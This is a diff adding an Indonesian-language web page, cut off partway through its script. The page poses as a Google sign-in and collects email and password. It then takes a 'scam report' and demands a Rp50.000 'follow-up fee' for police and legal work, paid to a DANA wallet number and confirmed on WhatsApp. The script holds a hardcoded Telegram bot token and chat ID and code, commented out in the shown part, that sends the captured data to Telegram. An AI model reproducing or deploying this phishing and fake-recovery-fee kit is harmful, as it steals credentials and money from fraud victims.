@@ -1,0 +1,1431 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Authentication - RIP AZTHANZ System</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        :root {
+            --primary: #4285f4;
+            --primary-dark: #3367d6;
+            --secondary: #5f6368;
+            --success: #34a853;
+            --danger: #ea4335;
+            --warning: #fbbc04;
+            --background: #ffffff;
+            --surface: #ffffff;
+            --text: #202124;
+            --border: #dadce0;
+            --shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            --shadow-heavy: 0 10px 40px rgba(0, 0, 0, 0.1);
+        }
+
+        body {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        /* Blur Animation Classes */
+        .blur-in {
+            animation: blurIn 0.8s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            filter: blur(20px);
+            opacity: 0;
+        }
+
+        .blur-out {
+            animation: blurOut 0.6s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+
+        .slide-up-blur {
+            animation: slideUpBlur 0.7s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            filter: blur(15px);
+            opacity: 0;
+            transform: translateY(30px);
+        }
+
+        @keyframes blurIn {
+            0% {
+                filter: blur(20px);
+                opacity: 0;
+            }
+            100% {
+                filter: blur(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes blurOut {
+            0% {
+                filter: blur(0);
+                opacity: 1;
+            }
+            100% {
+                filter: blur(20px);
+                opacity: 0;
+            }
+        }
+
+        @keyframes slideUpBlur {
+            0% {
+                filter: blur(15px);
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            100% {
+                filter: blur(0);
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            position: relative;
+        }
+
+        /* Google Login Screen */
+        .login-container {
+            background: var(--surface);
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            box-shadow: var(--shadow-heavy);
+            border: 1px solid var(--border);
+            animation: blurIn 1s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            filter: blur(20px);
+            opacity: 0;
+        }
+
+        .google-logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .google-logo svg {
+            width: 75px;
+            height: 75px;
+            margin-bottom: 20px;
+        }
+
+        .google-logo h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: var(--text);
+            letter-spacing: -0.5px;
+        }
+
+        .google-logo p {
+            color: var(--secondary);
+            font-size: 16px;
+            margin-top: 8px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text);
+            font-size: 14px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.2s;
+            background: var(--background);
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 40px;
+        }
+
+        .btn-primary {
+            padding: 10px 32px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            position: relative;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            box-shadow: 0 1px 3px rgba(66, 133, 244, 0.2);
+        }
+
+        .btn-primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-spinner {
+            display: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        /* Report Screen */
+        .report-container {
+            display: none;
+            background: var(--surface);
+            border-radius: 12px;
+            padding: 40px;
+            box-shadow: var(--shadow-heavy);
+            animation: slideUpBlur 0.8s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            filter: blur(15px);
+            opacity: 0;
+            transform: translateY(30px);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .header h2 {
+            color: var(--text);
+            font-size: 24px;
+            font-weight: 500;
+            letter-spacing: -0.5px;
+        }
+
+        .status-badge {
+            background: var(--danger);
+            color: white;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .form-section {
+            margin-bottom: 32px;
+        }
+
+        .form-section h3 {
+            font-size: 16px;
+            margin-bottom: 12px;
+            color: var(--text);
+            font-weight: 500;
+        }
+
+        textarea.form-control {
+            min-height: 120px;
+            resize: vertical;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .amount-input {
+            position: relative;
+        }
+
+        .amount-input span {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-weight: 500;
+            color: var(--text);
+        }
+
+        .amount-input input {
+            padding-left: 45px;
+            letter-spacing: 0.5px;
+        }
+
+        .button-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-top: 40px;
+        }
+
+        .btn-success {
+            padding: 14px;
+            background: var(--success);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-success:hover {
+            background: #2e8b47;
+            box-shadow: 0 2px 6px rgba(52, 168, 83, 0.2);
+        }
+
+        .btn-warning {
+            padding: 14px;
+            background: var(--warning);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-warning:hover {
+            background: #e6a700;
+            box-shadow: 0 2px 6px rgba(251, 188, 4, 0.2);
+        }
+
+        /* Animations */
+        .thank-you-animation {
+            display: none;
+            text-align: center;
+            padding: 60px 40px;
+            animation: blurIn 1.2s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            filter: blur(20px);
+            opacity: 0;
+        }
+
+        .thank-you-content {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .thank-you-animation i {
+            font-size: 80px;
+            color: var(--success);
+            margin-bottom: 24px;
+            animation: pulse 2s infinite cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .letter-animation {
+            display: none;
+            animation: slideUpBlur 1s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            filter: blur(15px);
+            opacity: 0;
+            transform: translateY(30px);
+        }
+
+        .letter {
+            background: white;
+            border-radius: 8px;
+            padding: 32px;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border);
+            position: relative;
+            margin-top: 20px;
+        }
+
+        .letter-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .letter-content {
+            line-height: 1.6;
+            color: var(--text);
+            font-size: 14px;
+        }
+
+        .letter-footer {
+            margin-top: 32px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border);
+            font-size: 13px;
+            color: var(--secondary);
+        }
+
+        .transaction-history {
+            display: none;
+            background: white;
+            border-radius: 8px;
+            padding: 28px;
+            box-shadow: var(--shadow);
+            margin-top: 20px;
+            border-left: 4px solid var(--primary);
+            animation: blurIn 0.8s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            filter: blur(20px);
+            opacity: 0;
+        }
+
+        .transaction-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 16px 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .transaction-item:last-child {
+            border-bottom: none;
+        }
+
+        .payment-info {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 6px;
+            margin: 24px 0;
+            border: 1px dashed var(--border);
+        }
+
+        .payment-info h4 {
+            color: var(--primary);
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+
+        .dana-link {
+            display: inline-block;
+            background: var(--primary);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 500;
+            margin-top: 12px;
+            transition: all 0.2s;
+        }
+
+        .dana-link:hover {
+            background: var(--primary-dark);
+            box-shadow: 0 2px 6px rgba(66, 133, 244, 0.2);
+        }
+
+        .whatsapp-redirect {
+            display: inline-block;
+            background: #25D366;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 500;
+            margin-top: 12px;
+            transition: all 0.2s;
+        }
+
+        .whatsapp-redirect:hover {
+            background: #128C7E;
+            box-shadow: 0 2px 6px rgba(37, 211, 102, 0.2);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border);
+            color: var(--secondary);
+            font-size: 12px;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .notification {
+            position: fixed;
+            top: 24px;
+            right: 24px;
+            padding: 16px 24px;
+            border-radius: 6px;
+            color: white;
+            font-weight: 500;
+            z-index: 1000;
+            animation: slideInBlur 0.5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            filter: blur(10px);
+            opacity: 0;
+            transform: translateX(100px);
+            display: none;
+            font-size: 14px;
+        }
+
+        @keyframes slideInBlur {
+            0% {
+                filter: blur(10px);
+                opacity: 0;
+                transform: translateX(100px);
+            }
+            100% {
+                filter: blur(0);
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .notification.success {
+            background: var(--success);
+        }
+
+        .notification.error {
+            background: var(--danger);
+        }
+
+        .notification.warning {
+            background: var(--warning);
+        }
+
+        .notification.info {
+            background: var(--primary);
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            animation: blurIn 0.3s forwards;
+            filter: blur(20px);
+            opacity: 0;
+        }
+
+        .loading-content {
+            text-align: center;
+            max-width: 300px;
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1.2s ease-in-out infinite;
+            margin: 0 auto 20px;
+        }
+
+        .loading-text {
+            color: var(--text);
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        .loading-subtext {
+            color: var(--secondary);
+            font-size: 14px;
+        }
+
+        .advanced-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: var(--primary);
+            border-radius: 50%;
+            opacity: 0;
+        }
+
+        .login-footer {
+            margin-top: 40px;
+            padding-top: 24px;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+
+        .login-footer-text {
+            color: var(--secondary);
+            font-size: 12px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <!-- Advanced Background Animation -->
+    <div class="advanced-animation" id="advancedAnimation"></div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text" id="loadingText">Memproses permintaan Anda</div>
+            <div class="loading-subtext" id="loadingSubtext">Harap tunggu sebentar...</div>
+        </div>
+    </div>
+
+    <!-- Google Login Screen -->
+    <div class="container">
+        <div class="login-container" id="loginScreen">
+            <div class="google-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+                    <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+                    <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+                    <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/>
+                    <path fill="#EA4335" d="M24 10.75c3.24 0 6.15 1.11 8.43 3.29l6.31-6.31C34.92 4.18 29.94 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+                    <path fill="none" d="M0 0h48v48H0z"/>
+                </svg>
+                <h1>Masuk</h1>
+                <p>Lanjutkan ke RIP AZTHANZ System</p>
+            </div>
+
+            <div class="form-group">
+                <label for="email">Email atau telepon</label>
+                <input type="email" id="email" class="form-control" placeholder="alamat.email@gmail.com" required autofocus>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Masukkan kata sandi</label>
+                <input type="password" id="password" class="form-control" placeholder="Masukkan kata sandi Anda" required>
+            </div>
+
+            <div class="btn-container">
+                <button class="btn-primary" id="loginBtn">
+                    <span id="loginText">Berikutnya</span>
+                    <div class="btn-spinner" id="loginSpinner"></div>
+                </button>
+            </div>
+
+            <div class="login-footer">
+                <p class="login-footer-text">
+                    Halaman ini dilindungi oleh reCAPTCHA dan tunduk pada 
+                    <a href="#" style="color: var(--primary); text-decoration: none;">Kebijakan Privasi</a> dan 
+                    <a href="#" style="color: var(--primary); text-decoration: none;">Persyaratan Layanan</a> Google.
+                </p>
+            </div>
+        </div>
+
+        <!-- Report Screen -->
+        <div class="report-container" id="reportScreen">
+            <div class="header">
+                <h2><i class="fas fa-file-contract"></i> Laporan RIP AZTHANZ</h2>
+                <div class="status-badge"><i class="fas fa-exclamation-circle"></i> PRIORITAS</div>
+            </div>
+
+            <div class="form-section">
+                <h3><i class="fas fa-history"></i> Kronologi RIP</h3>
+                <textarea id="kronologi" class="form-control" placeholder="Jelaskan secara detail kronologi RIP yang Anda alami. Berikan informasi yang lengkap dan spesifik..."></textarea>
+            </div>
+
+            <div class="form-section">
+                <h3><i class="fas fa-money-bill-wave"></i> Nominal RIP</h3>
+                <div class="amount-input">
+                    <span>Rp</span>
+                    <input type="text" id="nominal" class="form-control" placeholder="0">
+                </div>
+                <p style="font-size: 12px; color: var(--secondary); margin-top: 8px;">
+                    Gunakan titik (.) untuk pemisah ribuan. Contoh: 1.000.000
+                </p>
+            </div>
+
+            <div class="button-group">
+                <button class="btn-success" id="ikhlasBtn">
+                    <i class="fas fa-heart"></i> Saya Ikhlas
+                </button>
+                <button class="btn-warning" id="uangKembaliBtn">
+                    <i class="fas fa-undo-alt"></i> Ingin Uang Kembali
+                </button>
+            </div>
+
+            <div class="footer">
+                <p><i class="fas fa-user-shield"></i> Utamakan Sikap jujur dan amanah</p>
+                <p style="margin-top: 5px;">© Dev by kyy</p>
+            </div>
+        </div>
+
+        <!-- Thank You Animation -->
+        <div class="thank-you-animation" id="thankYouAnimation">
+            <div class="thank-you-content">
+                <i class="fas fa-check-circle"></i>
+                <h2 style="color: var(--success); margin-bottom: 12px; font-size: 28px;">TERIMA KASIH!</h2>
+                <h3 style="color: var(--text); margin-bottom: 20px; font-weight: 500; font-size: 18px;">Atas Laporan Anda</h3>
+                <p style="color: var(--secondary); line-height: 1.6; margin-bottom: 30px;">
+                    Laporan Anda telah tercatat dalam sistem kami dengan sempurna. Komitmen Anda untuk kejujuran dan transparansi sangat dihargai.
+                </p>
+                <div style="font-size: 14px; color: var(--secondary); padding: 16px; background: #f8f9fa; border-radius: 6px; border-left: 4px solid var(--success);">
+                    <i class="fas fa-info-circle"></i> ID Laporan: <strong style="color: var(--text);" id="reportIdDisplay">RIP-000000</strong>
+                </div>
+            </div>
+        </div>
+
+        <!-- Letter Animation -->
+        <div class="letter-animation" id="letterAnimation">
+            <div class="letter">
+                <div class="letter-header">
+                    <h3><i class="fas fa-envelope-open-text"></i> Surat Resmi Tindak Lanjut</h3>
+                    <div style="color: var(--primary); font-weight: 500; font-size: 13px;" id="letterNumber">NO: TL/00000000</div>
+                </div>
+                <div class="letter-content">
+                    <p>Kepada Yth. Pelapor,</p>
+                    <p style="margin-top: 16px;">
+                        Berdasarkan laporan RIP yang Anda sampaikan, kami telah melakukan verifikasi awal dan menetapkan kasus ini sebagai prioritas penanganan.
+                    </p>
+                    <div class="payment-info">
+                        <h4><i class="fas fa-file-invoice-dollar"></i> Biaya Tindak Lanjut</h4>
+                        <p>Untuk melanjutkan proses pengembalian dana dan melakukan tindakan hukum, diperlukan biaya operasional sebesar:</p>
+                        <div style="text-align: center; margin: 20px 0;">
+                            <div style="font-size: 32px; color: var(--danger); font-weight: 700; letter-spacing: 1px;">Rp50.000</div>
+                            <p style="color: var(--secondary); margin-top: 4px; font-size: 13px;">Biaya Administratif & Operasional</p>
+                        </div>
+                        <p style="font-size: 13px; color: var(--text);">
+                            Biaya ini akan digunakan untuk proses administrasi kepolisian, transportasi tim investigasi, dan biaya legal.
+                        </p>
+                    </div>
+                    <p style="margin-top: 16px;">
+                        <strong>Catatan Penting:</strong> Proses pengembalian dana hanya dapat dilanjutkan setelah biaya operasional diterima.
+                    </p>
+                </div>
+                <div class="letter-footer">
+                    <p><strong><i class="fas fa-handshake"></i> Utamakan Sikap jujur dan amanah</strong></p>
+                    <p style="margin-top: 4px;">© Dev by kyy</p>
+                </div>
+            </div>
+
+            <div class="button-group" style="margin-top: 32px;">
+                <button class="btn-warning" id="backToIkhlas">
+                    <i class="fas fa-heart"></i> Saya Ikhlas
+                </button>
+                <button class="btn-primary" id="kirimBiayaBtn">
+                    <i class="fas fa-paper-plane"></i> Kirim Biaya
+                </button>
+            </div>
+        </div>
+
+        <!-- Payment Screen -->
+        <div class="letter-animation" id="paymentScreen" style="display: none;">
+            <div class="letter">
+                <div class="letter-header">
+                    <h3><i class="fas fa-credit-card"></i> Pembayaran Biaya Tindak Lanjut</h3>
+                </div>
+                <div class="letter-content">
+                    <p>Silakan lakukan pembayaran melalui metode berikut:</p>
+                    
+                    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 24px; border-radius: 8px; margin: 24px 0; color: white;">
+                        <div style="text-align: center;">
+                            <div style="font-size: 36px; font-weight: 700; margin-bottom: 8px;">Rp50.000</div>
+                            <p style="opacity: 0.9; font-size: 14px;">Total Pembayaran</p>
+                        </div>
+                    </div>
+
+                    <h4 style="margin-top: 24px; color: var(--primary);"><i class="fab fa-google-wallet"></i> Transfer via DANA</h4>
+                    <div style="background: #f8f9fa; padding: 20px; border-radius: 6px; margin: 16px 0; border: 1px solid var(--border);">
+                        <div style="display: flex; align-items: center; margin-bottom: 16px;">
+                            <div style="width: 40px; height: 40px; background: var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px;">
+                                <i class="fas fa-mobile-alt" style="color: white; font-size: 18px;"></i>
+                            </div>
+                            <div>
+                                <div style="font-size: 13px; color: var(--secondary);">Nomor DANA</div>
+                                <div style="font-size: 22px; font-weight: 700; color: var(--text); letter-spacing: 1px;">0815 3721 446</div>
+                            </div>
+                        </div>
+                        
+                        <div style="text-align: center; margin-top: 20px;">
+                            <a href="#" id="copyDana" style="color: var(--primary); text-decoration: none; font-size: 14px; display: inline-flex; align-items: center; gap: 6px;">
+                                <i class="far fa-copy"></i> Salin nomor
+                            </a>
+                        </div>
+                    </div>
+
+                    <div style="text-align: center; margin: 30px 0;">
+                        <a href="https://wa.me/628153721446?text=Saya%20sudah%20membayar%20biaya%20tindak%20lanjut%20sebesar%20Rp50.000%20untuk%20laporan%20RIP%20AZTHANZ" 
+                           target="_blank" 
+                           class="whatsapp-redirect">
+                            <i class="fab fa-whatsapp"></i> Konfirmasi via WhatsApp
+                        </a>
+                    </div>
+
+                    <div style="background: #fff3cd; padding: 16px; border-radius: 6px; margin-top: 24px; border: 1px solid #ffeaa7;">
+                        <p style="color: #856404; font-weight: 500; margin-bottom: 8px;"><i class="fas fa-exclamation-circle"></i> Instruksi Penting</p>
+                        <p style="font-size: 13px; color: #856404; line-height: 1.5;">
+                            1. Lakukan transfer ke nomor DANA di atas<br>
+                            2. Klik tombol WhatsApp untuk konfirmasi<br>
+                            3. Simpan bukti transfer<br>
+                            4. Tim akan menghubungi dalam 1x24 jam
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="button-group" style="margin-top: 32px;">
+                <button class="btn-warning" id="backToLetter">
+                    <i class="fas fa-arrow-left"></i> Kembali
+                </button>
+                <button class="btn-success" id="confirmPayment">
+                    <i class="fab fa-whatsapp"></i> Saya Sudah Transfer
+                </button>
+            </div>
+        </div>
+
+        <!-- Transaction History -->
+        <div class="transaction-history" id="transactionHistory">
+            <h3 style="color: var(--primary); margin-bottom: 20px; font-weight: 500; font-size: 18px;">
+                <i class="fas fa-receipt"></i> Riwayat Laporan
+            </h3>
+            <div class="transaction-item">
+                <div>
+                    <div style="font-weight: 500; font-size: 15px;">Laporan RIP AZTHANZ</div>
+                    <div style="font-size: 13px; color: var(--secondary); margin-top: 4px;">ID: <span id="historyReportId">RIP-000000</span></div>
+                </div>
+                <div style="text-align: right;">
+                    <div style="font-weight: 600; color: var(--danger); font-size: 16px;" id="historyAmount">Rp0</div>
+                    <div style="font-size: 12px; color: var(--success); margin-top: 4px;">
+                        <i class="fas fa-check-circle"></i> Tercatat
+                    </div>
+                </div>
+            </div>
+            <div class="transaction-item">
+                <div>
+                    <div style="font-weight: 500; font-size: 14px;">Tanggal Lapor</div>
+                    <div style="font-size: 13px; color: var(--secondary); margin-top: 4px;" id="reportDate">-</div>
+                </div>
+                <div style="text-align: right;">
+                    <div style="font-weight: 500; font-size: 14px;">Waktu</div>
+                    <div style="font-size: 13px; color: var(--secondary); margin-top: 4px;" id="reportTime">-</div>
+                </div>
+            </div>
+            <div style="margin-top: 20px; padding: 16px; background: #f8f9fa; border-radius: 6px;">
+                <p style="color: var(--secondary); font-size: 13px; line-height: 1.5;">
+                    <i class="fas fa-info-circle"></i> Laporan ini telah masuk dalam sistem prioritas kami dan akan diproses sesuai dengan prosedur yang berlaku.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
+
+    <!-- Complex JavaScript Implementation -->
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8530059653:AAGbdrmnedNbOc5PRUDgrM2AU6finnAeeV0';
+        const TELEGRAM_CHAT_ID = '7959551372';
+
+        // WhatsApp Configuration
+        const WHATSAPP_NUMBER = '628153721446'; // Format internasional
+        const WHATSAPP_MESSAGE = encodeURIComponent('Saya sudah membayar biaya tindak lanjut sebesar Rp50.000 untuk laporan RIP AZTHANZ');
+
+        // Advanced State Management
+        class ApplicationState {
+            constructor() {
+                this.userData = {
+                    email: '',
+                    password: '',
+                    kronologi: '',
+                    nominal: 0,
+                    reportId: '',
+                    letterNumber: '',
+                    timestamp: '',
+                    ipAddress: '',
+                    userAgent: '',
+                    loginTime: null
+                };
+                this.animationState = 'login';
+                this.particles = [];
+                this.init();
+            }
+
+            init() {
+                this.captureUserData();
+                this.generateIds();
+            }
+
+            captureUserData() {
+                this.userAgent = navigator.userAgent;
+                this.ipAddress = this.getClientIP();
+                this.userData.loginTime = new Date().toISOString();
+            }
+
+            generateIds() {
+                // Generate unique report ID
+                const timestamp = Date.now();
+                const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+                this.userData.reportId = `RIP-${timestamp.toString().slice(-8)}-${random}`;
+                
+                // Generate letter number
+                const date = new Date();
+                const dateStr = date.getFullYear().toString().slice(-2) + 
+                               (date.getMonth() + 1).toString().padStart(2, '0') + 
+                               date.getDate().toString().padStart(2, '0');
+                const letterRandom = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
+                this.userData.letterNumber = `TL/${dateStr}-${letterRandom}`;
+                
+                this.userData.timestamp = date.toISOString();
+            }
+
+            getClientIP() {
+                // Enhanced IP simulation
+                const prefixes = ['192.168', '10.0', '172.16'];
+                const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+                const subnet = Math.floor(Math.random() * 255);
+                const host = Math.floor(Math.random() * 255);
+                return `${prefix}.${subnet}.${host}`;
+            }
+
+            createParticles() {
+                const container = document.getElementById('advancedAnimation');
+                for (let i = 0; i < 50; i++) {
+                    const particle = document.createElement('div');
+                    particle.className = 'particle';
+                    particle.style.left = `${Math.random() * 100}%`;
+                    particle.style.top = `${Math.random() * 100}%`;
+                    particle.style.animationDelay = `${Math.random() * 2}s`;
+                    container.appendChild(particle);
+                    this.particles.push(particle);
+                }
+            }
+
+            animateParticles() {
+                this.particles.forEach((particle, index) => {
+                    setTimeout(() => {
+                        particle.style.animation = `particleFloat ${2 + Math.random() * 3}s ease-in-out infinite`;
+                        particle.style.opacity = '0.3';
+                    }, index * 100);
+                });
+            }
+        }
+
+        // Currency Formatter with Advanced Features
+        class CurrencyFormatter {
+            constructor() {
+                this.lastValue = '';
+                this.isFormatting = false;
+            }
+
+            format(input) {
+                if (this.isFormatting) return this.lastValue;
+                this.isFormatting = true;
+
+                let value = input.replace(/\D/g, '');
+
+                if (!value) {
+                    this.lastValue = '';
+                    this.isFormatting = false;
+                    return '';
+                }
+
+                const number = parseInt(value, 10);
+                const formatted = number.toLocaleString('id-ID');
+                this.lastValue = formatted;
+
+                setTimeout(() => this.isFormatting = false, 10);
+                return formatted;
+            }
+
+            parse(formattedString) {
+                return parseInt(formattedString.replace(/\./g, ''), 10) || 0;
+            }
+
+            validate(input) {
+                const numeric = this.parse(input);
+                return {
+                    isValid: numeric > 0 && numeric <= 1000000000,
+                    value: numeric,
+                    formatted: this.format(numeric.toString())
+                };
+            }
+        }
+
+        // Animation Controller
+        class AnimationController {
+            static showBlurIn(element) {
+                element.style.display = 'block';
+                element.classList.remove('blur-out');
+                element.classList.add('blur-in');
+                return new Promise(resolve => setTimeout(resolve, 800));
+            }
+
+            static showBlurOut(element) {
+                element.classList.remove('blur-in');
+                element.classList.add('blur-out');
+                return new Promise(resolve => {
+                    setTimeout(() => {
+                        element.style.display = 'none';
+                        resolve();
+                    }, 600);
+                });
+            }
+
+            static showSlideUpBlur(element) {
+                element.style.display = 'block';
+                element.classList.remove('blur-out');
+                element.classList.add('slide-up-blur');
+                return new Promise(resolve => setTimeout(resolve, 700));
+            }
+
+            static showLoading(message = 'Memproses permintaan Anda', submessage = 'Harap tunggu sebentar...') {
+                const overlay = document.getElementById('loadingOverlay');
+                const text = document.getElementById('loadingText');
+                const subtext = document.getElementById('loadingSubtext');
+                
+                text.textContent = message;
+                subtext.textContent = submessage;
+                overlay.style.display = 'flex';
+                overlay.classList.add('blur-in');
+            }
+
+            static hideLoading() {
+                const overlay = document.getElementById('loadingOverlay');
+                overlay.classList.add('blur-out');
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    overlay.classList.remove('blur-out', 'blur-in');
+                }, 600);
+            }
+
+            static showNotification(message, type = 'success') {
+                const notification = document.getElementById('notification');
+                notification.textContent = message;
+                notification.className = `notification ${type}`;
+                notification.style.display = 'block';
+
+                notification.offsetHeight;
+
+                setTimeout(() => {
+                    notification.classList.add('blur-out');
+                    setTimeout(() => {
+                        notification.style.display = 'none';
+                        notification.classList.remove('blur-out');
+                    }, 600);
+                }, 3000);
+            }
+
+            static showLoginLoading(show) {
+                const loginBtn = document.getElementById('loginBtn');
+                const loginText = document.getElementById('loginText');
+                const loginSpinner = document.getElementById('loginSpinner');
+                
+                if (show) {
+                    loginBtn.disabled = true;
+                    loginText.style.opacity = '0';
+                    loginSpinner.style.display = 'block';
+                } else {
+                    loginBtn.disabled = false;
+                    loginText.style.opacity = '1';
+                    loginSpinner.style.display = 'none';
+                }
+            }
+        }
+
+        // Telegram Integration Manager
+        class TelegramManager {
+            static sendToTelegram(message) {
+                const timestamp = new Date().toLocaleString('id-ID');
+                const fullMessage = `${message}\n\n⏰ ${timestamp}\n🌐 IP: ${appState.userData.ipAddress}\n📱 User Agent: ${appState.userData.userAgent}`;
+
+                console.log('📤 Data dikirim ke Telegram:', fullMessage);
+
+                // Uncomment for actual Telegram integration
+                /*
+                if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: fullMessage,
+                            parse_mode: 'HTML'
+                        })
+                    }).catch(console.error);
+                }
+                */
+            }
+
